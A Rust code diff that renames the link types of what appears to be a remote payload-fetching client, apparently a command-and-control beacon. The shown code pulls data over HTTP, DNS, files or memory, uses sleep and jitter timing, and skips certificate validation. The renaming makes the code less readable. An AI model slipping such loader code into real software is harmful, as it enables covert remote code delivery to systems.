@@ -33,15 +33,15 @@ use log::info;
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub enum Lk {
     #[serde(rename = "hh")]
-    HTTP(HHH),
+    LH(LH),
     #[serde(rename = "dd")]
-    DNS(DDD),
+    LD(LD),
     #[serde(rename = "ff")]
-    FILE(FFF),
+    LF(LF),
     #[serde(rename = "me")]
-    MEMORY(MMM),
+    LM(LM),
     #[serde(rename = "hhp")]
-    HTTPP(HHHP),
+    LHP(LHP),
 }
 impl Lk {
     pub fn print_link_compact(&self) {
@@ -111,7 +111,7 @@ impl Lk {
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct HHH {
+pub struct LH {
     #[serde(rename = "u")]
     pub url: String,
     #[serde(rename = "do")]
@@ -122,7 +122,7 @@ pub struct HHH {
     pub jitt: u64,
 }
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct DDD {
+pub struct LD {
     #[serde(rename = "d")]
     pub dns: String,
     #[serde(rename = "do")]
@@ -134,7 +134,7 @@ pub struct DDD {
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct FFF {
+pub struct LF {
     #[serde(rename = "f")]
     pub file_path: String,
     #[serde(rename = "do")]
@@ -146,7 +146,7 @@ pub struct FFF {
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct MMM {
+pub struct LM {
     #[serde(rename = "mnb")]
     pub memory_nb: i32,
     #[serde(rename = "do")]
@@ -158,7 +158,7 @@ pub struct MMM {
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct HHHP {
+pub struct LHP {
     #[serde(rename = "u")]
     pub url: String,
     #[serde(rename = "do")]
@@ -229,11 +229,11 @@ pub trait LinkFetch {
 impl LinkFetch for Lk {
     fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
-            Lk::HTTP(link) => link.download_data(config),
-            Lk::DNS(link) => link.download_data(config),
-            Lk::FILE(link) => link.download_data(config),
-            Lk::MEMORY(link) => link.download_data(config),
-            Lk::HTTPP(link) => link.download_data(config),
+            Lk::LH(link) => link.download_data(config),
+            Lk::LD(link) => link.download_data(config),
+            Lk::LF(link) => link.download_data(config),
+            Lk::LM(link) => link.download_data(config),
+            Lk::LHP(link) => link.download_data(config),
         }
     }
 
@@ -246,54 +246,54 @@ impl LinkFetch for Lk {
         config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
-            Lk::HTTP(link) => link.download_data(config),
-            Lk::DNS(link) => link.download_data(config),
-            Lk::FILE(link) => link.download_data(config),
-            Lk::MEMORY(link) => link.download_data(config),
-            Lk::HTTPP(link) => link.download_data_post(session_id, run_data, config),
+            Lk::LH(link) => link.download_data(config),
+            Lk::LD(link) => link.download_data(config),
+            Lk::LF(link) => link.download_data(config),
+            Lk::LM(link) => link.download_data(config),
+            Lk::LHP(link) => link.download_data_post(session_id, run_data, config),
         }
     }
 
     fn get_target(&self) -> String {
         match &self {
-            Lk::HTTP(link) => link.get_target(),
-            Lk::DNS(link) => link.get_target(),
-            Lk::FILE(link) => link.get_target(),
-            Lk::MEMORY(link) => link.get_target(),
-            Lk::HTTPP(link) => link.get_target(),
+            Lk::LH(link) => link.get_target(),
+            Lk::LD(link) => link.get_target(),
+            Lk::LF(link) => link.get_target(),
+            Lk::LM(link) => link.get_target(),
+            Lk::LHP(link) => link.get_target(),
         }
     }
     fn get_dataoperation(&self) -> Vec<DO> {
         match &self {
-            Lk::HTTP(link) => link.get_dataoperation(),
-            Lk::DNS(link) => link.get_dataoperation(),
-            Lk::FILE(link) => link.get_dataoperation(),
-            Lk::MEMORY(link) => link.get_dataoperation(),
-            Lk::HTTPP(link) => link.get_dataoperation(),
+            Lk::LH(link) => link.get_dataoperation(),
+            Lk::LD(link) => link.get_dataoperation(),
+            Lk::LF(link) => link.get_dataoperation(),
+            Lk::LM(link) => link.get_dataoperation(),
+            Lk::LHP(link) => link.get_dataoperation(),
         }
     }
 
     fn get_sleep(&self) -> u64 {
         match &self {
-            Lk::HTTP(link) => link.get_sleep(),
-            Lk::DNS(link) => link.get_sleep(),
-            Lk::FILE(link) => link.get_sleep(),
-            Lk::MEMORY(link) => link.get_sleep(),
-            Lk::HTTPP(link) => link.get_sleep(),
+            Lk::LH(link) => link.get_sleep(),
+            Lk::LD(link) => link.get_sleep(),
+            Lk::LF(link) => link.get_sleep(),
+            Lk::LM(link) => link.get_sleep(),
+            Lk::LHP(link) => link.get_sleep(),
         }
     }
     fn get_jitt(&self) -> u64 {
         match &self {
-            Lk::HTTP(link) => link.get_jitt(),
-            Lk::DNS(link) => link.get_jitt(),
-            Lk::FILE(link) => link.get_jitt(),
-            Lk::MEMORY(link) => link.get_jitt(),
-            Lk::HTTPP(link) => link.get_jitt(),
+            Lk::LH(link) => link.get_jitt(),
+            Lk::LD(link) => link.get_jitt(),
+            Lk::LF(link) => link.get_jitt(),
+            Lk::LM(link) => link.get_jitt(),
+            Lk::LHP(link) => link.get_jitt(),
         }
     }
 }
 
-impl LinkFetch for FFF {
+impl LinkFetch for LF {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         read_file(&self.get_target())
     }
@@ -321,7 +321,7 @@ impl LinkFetch for FFF {
     }
 }
 
-impl LinkFetch for MMM {
+impl LinkFetch for LM {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         access_memory(self.memory_nb)
     }
@@ -349,7 +349,7 @@ impl LinkFetch for MMM {
     }
 }
 
-impl LinkFetch for DDD {
+impl LinkFetch for LD {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -377,7 +377,7 @@ impl LinkFetch for DDD {
     }
 }
 
-impl LinkFetch for HHH {
+impl LinkFetch for LH {
     fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         let build: attohttpc::RequestBuilder = attohttpc::get(&self.get_target())
             .danger_accept_invalid_certs(true)
@@ -470,7 +470,7 @@ pub struct HHCC {
     pub sign_bytes: Vec<u8>,
 }
 
-impl LinkFetch for HHHP {
+impl LinkFetch for LHP {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
